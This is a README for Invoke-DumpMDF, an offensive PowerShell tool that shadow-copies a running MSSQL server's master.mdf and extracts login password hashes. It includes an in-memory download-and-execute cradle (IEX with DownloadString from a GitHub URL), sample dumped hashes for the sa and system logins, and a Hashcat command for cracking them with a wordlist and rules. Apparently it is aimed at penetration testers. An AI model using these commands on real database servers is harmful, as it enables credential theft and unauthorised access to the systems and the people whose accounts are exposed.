# Invoke-DumpMDF

Invoke-DumpMDF is a PowerShell script based on the original code by XPN (xpn.github.io). Invoke-DumpMDF creates a Volume Shadow Copy of the running MSSQL database, allowing the master.mdf file to be safely copied even while in use. It then extracts the login password hashes found within the master database.

The resulting hashes can be cracked with Hashcat.

## Requirements
- Administrative or SYSTEM level privileges are required.
- Execution on MSSQL Servers

## Usage
```powershell
# Load into memory
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-DumpMDF/refs/heads/main/Invoke-DumpMDF.ps1")

# Execute
Invoke-DumpMDF
```
  
## Example Output
```powershell
PS> Invoke-DumpMDF

Name  : sa
Value : 0x020050B40C7843AC5C196F9375549D3...

Name  : MS_PolicyEventProcessingLogin
Value : 0x0200F54F742AB9F142716E96CB13317...

Name  : MS_PolicyTsqlExecutionLogin
Value : 0x020043538738C5813669062A64AS0CC...
```
## Crack with Hashcat
```
hashcat.exe -m 1731 -a 0 -O 0x020050B40C7843AC5C196F9375549D3... Wordlists\rockyou.txt -r rules\best64.rule
```
## Further Reading 
- https://blog.xpnsec.com/extracting-master-mdf-hashes/
- https://medium.com/@jacobdiamond/extracting-sql-user-hashes-leveraging-bak-files-for-mssql-server-access-in-ad-pentest-b42e7bbcc88c
- https://github.com/xpn/Powershell-PostExploitation/blob/master/Invoke-MDFHashes/Get-MDFHashes.ps1
